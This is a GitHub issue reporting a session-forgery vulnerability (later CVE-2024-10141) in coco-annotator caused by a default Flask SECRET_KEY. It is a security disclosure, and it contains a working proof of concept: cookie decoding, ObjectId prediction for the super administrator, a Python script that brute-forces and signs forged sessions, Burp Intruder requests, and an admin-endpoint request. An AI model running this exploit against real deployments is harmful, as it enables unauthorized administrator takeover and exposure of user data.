
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjsbroks%2Fcoco-annotator%2Fissues%2F626)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjsbroks%2Fcoco-annotator%2Fissues%2F626)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=jsbroks%2Fcoco-annotator)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[jsbroks](/jsbroks)
/
**[coco-annotator](/jsbroks/coco-annotator)**
Public

* [Notifications](/login?return_to=%2Fjsbroks%2Fcoco-annotator) You must be signed in to change notification settings
* [Fork
  467](/login?return_to=%2Fjsbroks%2Fcoco-annotator)
* [Star
   2.1k](/login?return_to=%2Fjsbroks%2Fcoco-annotator)

* [Code](/jsbroks/coco-annotator)
* [Issues
  220](/jsbroks/coco-annotator/issues)
* [Pull requests
  37](/jsbroks/coco-annotator/pulls)
* [Actions](/jsbroks/coco-annotator/actions)
* [Wiki](/jsbroks/coco-annotator/wiki)
* [Security](/jsbroks/coco-annotator/security)
* [Insights](/jsbroks/coco-annotator/pulse)

Additional navigation options

* [Code](/jsbroks/coco-annotator)
* [Issues](/jsbroks/coco-annotator/issues)
* [Pull requests](/jsbroks/coco-annotator/pulls)
* [Actions](/jsbroks/coco-annotator/actions)
* [Wiki](/jsbroks/coco-annotator/wiki)
* [Security](/jsbroks/coco-annotator/security)
* [Insights](/jsbroks/coco-annotator/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fjsbroks%2Fcoco-annotator%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fjsbroks%2Fcoco-annotator%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Default SECRET\_KEY can lead to arbitrary session forgery #626

Open

[gaogaostone](/gaogaostone) opened this issue
Oct 12, 2024
· 1 comment

Open

# [Default SECRET\_KEY can lead to arbitrary session forgery](#top) #626

[gaogaostone](/gaogaostone) opened this issue
Oct 12, 2024
· 1 comment

## Comments

[![@gaogaostone](https://avatars.githubusercontent.com/u/5965134?s=80&v=4)](/gaogaostone)

Copy link

### **[gaogaostone](/gaogaostone)** commented [Oct 12, 2024](#issue-2582440109)

| The coco-annotator project has a default SECRET\_KEY, which is used for signing and verifying Flask sessions. If the system administrator does not change the SECRET\_KEY when configuring the system, it can lead to arbitrary session forgery by any user and gain administrative privileges.  **Affected versions:** v0.11.1 Proof of concept **Step 1**: Open <http://x.x.x.x:5000/#/auth>. Click on the "register" option.Enter the required information to register a new user(such as, coco/123456). If the account already exists, skip the registration and proceed to step 2 directly.  **Step2**: Log into the system and get the Set-Cookie header in the response. Here is a example. [image](https://private-user-images.githubusercontent.com/5965134/375918841-6c634030-be7a-4733-a8b0-746374a5ba0d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjEyMDYsIm5iZiI6MTczNjU2MDkwNiwicGF0aCI6Ii81OTY1MTM0LzM3NTkxODg0MS02YzYzNDAzMC1iZTdhLTQ3MzMtYThiMC03NDYzNzRhNWJhMGQucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDIwMTQ2WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9OGFjMjA4ZGZkNDM0Mzk3YzNkODUyYTU1NjIxZGFjYTMxMzdjYzA5M2Y2MTlhMTg3ZTZhNmJiZDY1YTNmN2EwNSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.QPjMtTQdEG0gxEtS25Kmqy8Szga5W7ozNp4h_M3Mvyk)  **Step 3**: use the tool flask-session-cookie-manager( <https://github.com/noraj/flask-session-cookie-manager>) to decode the session and analyze the format of the session. `python3 flask_session_cookie_manager3.py decode -c ".eJwlzksOwjAMANG7eN2FP3HqcBkUx7Zg29IV4u4gcYB5mjfc68jzAbfXceUG92fADcJ8YR_NV9ooMzd0b-xYTL6KkoJkZ95thGHXkDYJp-Dk4WKFg6dniRrlsr4n1QxF8sQMsmLzNijFpnfkkvmLjKb70sayAja4zjz-M73_mJI2VJYqIroKSWf4fAE3ojSz.Zlgfkg.APoV6-pcsJ68eOGMsIiHF4OdOYk"` The decode result of session is as following: `b'{"_fresh":true,"_id":"d8bc0694bce89f88b80bb42b0f21bcf1e1d13722789d8065d34a10a30a29b38f092abef3581ec867e1fad501be0ed18f28b491e38ab602f3ab3881abbc5423cd","user_id":"66581f34953c55000b531362"}'`  **Step 4**: analyze the factors of user\_id. The user\_id is auto generated by mongodb, aka ObjectId. The rules of ObjectId can find on <https://www.cnblogs.com/btgyoyo/p/7156589.html>. ObjectId is a 12-byte BSON type string. In byte order, it represents the following: 4 bytes: UNIX timestamp 3 bytes: Identifies the machine running MongoDB(fixed) 2 bytes: Represents the process that generated this \_id(fixed, if no restarting) 3 bytes: A incrementing counter value starting from a random number. (can be calculated with new register user’s id and user counts)  Now, only the 4 bytes UNIX timestamp need be guessed. There is no need to guess from 1970, we can guess from now. The brute-force range for a day is 24*60*60=86400. The brute-force range for a year is 365*24*60\*60=31536000. Thus, we can forge the session and become anyone(of course, I want to be administrator).  **Step 5**: send the following request and get the counts of the system users.  ``` GET /api/info/ HTTP/1.1 Host: x.x.x.x:5000 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: keep-alive Referer: http://x.x.x.x:5000/ Content-Length: 2  ```  [image](https://private-user-images.githubusercontent.com/5965134/375918910-4a915cf0-446d-439a-8908-698af016a89b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjEyMDYsIm5iZiI6MTczNjU2MDkwNiwicGF0aCI6Ii81OTY1MTM0LzM3NTkxODkxMC00YTkxNWNmMC00NDZkLTQzOWEtODkwOC02OThhZjAxNmE4OWIucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDIwMTQ2WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YTdhNjZjMWU3OTAxYThjMGQyMWJkOWVjZDYzNDg2MGIxNTFlODk4NWI5ZmUyYmQyNmI1YzdkODM5YWE2ZGE1MyZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.5hrpdXM3lfEbQ4AOzzgF4TAmrYxKeXHKI4ezMVXd-cY)  **Step 6**: By brute-forcing the user\_id, one can forge a session. In coco-annotator, the first registered user is a super administrator. Based on the rule that last three bytes of user\_id is a continuous counter, the last three bytes of the super administrator's user\_id are 0x531362-4+1=0x53135f. If the default machine code and process remain unchanged, the last eight bytes of the super administrator's user\_id are 953c55000b53135f. Then, by estimating the system's deployment time range, one can brute-force and generate a forged session. After testing, the id field in the session is meaningless and can be freely modified. The script for brute-forcing and generating the session is as follows:  ``` # coding=utf-8 import time import datetime import subprocess  def call_script_and_write_output(user_id, output_file):     try:         # Construct the command with script name and arguments         command = "python3 flask_session_cookie_manager3.py encode -s \"RandomSecretKeyHere\"  -t '{\"_fresh\":True,\"_id\":\"e5fc7a54a73246c3b956026a87e4687d6daca473c28d0719269540d604cbd7fc61e910b12ebc84477fb7b8d76c7bbccf64ad1a852ad1bf80e7bac4b2174aba5f\",\"user_id\":\"%s\"}'" % user_id 	# Call the script and capture the output         print(command)         result = subprocess.getoutput(command)         print(result)          # Write the output to the file         with open(output_file, 'a+') as file:             file.write(result)             file.write("\n")          print(f"Output written to {output_file}")     except Exception as e:         print(f"An error occurred: {e}")  # 示例时间，可以根据需要修改 d_start = datetime.datetime(2024, 5, 29, 14, 30, 0) d_end = datetime.datetime(2024, 5, 29, 15, 00, 0) timestamp_start = int(time.mktime(d_start.timetuple())) timestamp_end = int(time.mktime(d_end.timetuple()))  print(f"时间 {d_start} 转化为16进制时间戳为 {hex(timestamp_start)}") print(f"时间 {d_end} 转化为16进制时间戳为 {hex(timestamp_end)}")  ss = "953c55000b53135f" #for item in range(0x6656cc28, 0x6656cc29): #for item in range(timestamp_start, timestamp_start+1): for item in range(timestamp_start, timestamp_end):     user_id = hex(item)[2:] + ss     print(user_id)     call_script_and_write_output(user_id, "/Users/stone/sessions.txt")  ```  **Step 7**: place the sessions in Intruder module of Burpsuite and brute-force the following request. The URL encoding must be disabled for session. When it response with status 200, it is the right forged session.  ``` GET /api/undo/list/?limit=50&type=all HTTP/1.1 Host: x.x.x.x:5000 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: keep-alive Referer: http://x.x.x.x:5000/ Content-Length: 2 Cookie: session=§a§  ```  [image](https://private-user-images.githubusercontent.com/5965134/375918938-c8f583c8-f8c2-4d14-9110-b2c19780381f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjEyMDYsIm5iZiI6MTczNjU2MDkwNiwicGF0aCI6Ii81OTY1MTM0LzM3NTkxODkzOC1jOGY1ODNjOC1mOGMyLTRkMTQtOTExMC1iMmMxOTc4MDM4MWYucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDIwMTQ2WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MmIxZWYxYmUwMTJjY2UzYTZlZjZiYWQ5YmUwYjA0YjUxNTY5MTViNzBhYTRkMjJhY2VhMDhkM2U0MzhlMmFjYSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.loUxqr43C4MdfFS0XQbaP9k-n6ntQNnVgQb9DmJGFpU)  **Step 8**: send following request with forged session to check whether I am administrator. This interface can only be accessed by administrator. It response with all user’s information and I am administrator.  ``` GET /api/admin/users?limit=52 HTTP/1.1 Host: x.x.x.x:5000 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: keep-alive Referer: http://x.x.x.x:5000/ Cookie: session=.eJwljjkOwjAQAP_iOsXa3sPOZ9BeFrQJqRB_JxLVNCPNfMpjHXk-y_4-rtzK4xVlL0nLRQlVekP2bpMYGuuQRB4SHOqK0r2NAKmz8SSEYEC3kOVcc1aw2tJ8IIosExsh7GLmvhg1qg5qN2wNSDF1tFYF1ZRW2cp15vGfYSb2uzSpOxEAGPXab-n7AyAQNWI.Zlg4qQ.7z6H7om53jMdLVSmmk4DPBLfOJY  ```  [image](https://private-user-images.githubusercontent.com/5965134/375919012-36485b77-93a4-4236-a280-be70a4a9ebc8.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjEyMDYsIm5iZiI6MTczNjU2MDkwNiwicGF0aCI6Ii81OTY1MTM0LzM3NTkxOTAxMi0zNjQ4NWI3Ny05M2E0LTQyMzYtYTI4MC1iZTcwYTRhOWViYzgucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDIwMTQ2WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9NTAzODE5NmE2ODMwOTQxNzgwYTk4Njk3ZGQ5ZTVlOWQ4NWYwNDM3ZDgxYzc4NTIyYjg4ODk0ZTI2MWM5NjcyMyZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.o2XRGzplmm7t-CGRDejwiPz5k4BufjkLJtXUlSFV3PY) |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@gaogaostone](https://avatars.githubusercontent.com/u/5965134?s=40&v=4)](/gaogaostone)
[gaogaostone](/gaogaostone)
changed the title
~~Default SECRET\_KEY can lead to can lead to arbitrary session forgery~~
Default SECRET\_KEY can lead to arbitrary session forgery
[Oct 12, 2024](#event-14615935377)

[![@gaogaostone](https://avatars.githubusercontent.com/u/5965134?s=80&v=4)](/gaogaostone)

Copy link

Author

### **[gaogaostone](/gaogaostone)** commented [Oct 21, 2024](#issuecomment-2425356283)

| This is marked as [CVE-2024-10141](https://github.com/advisories/GHSA-63wj-prj6-f5fr "CVE-2024-10141") |
| --- |

All reactions

Sorry, something went wrong.

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fjsbroks%2Fcoco-annotator%2Fissues%2F626)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

1 participant

[![@gaogaostone](https://avatars.githubusercontent.com/u/5965134?s=52&v=4)](/gaogaostone)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

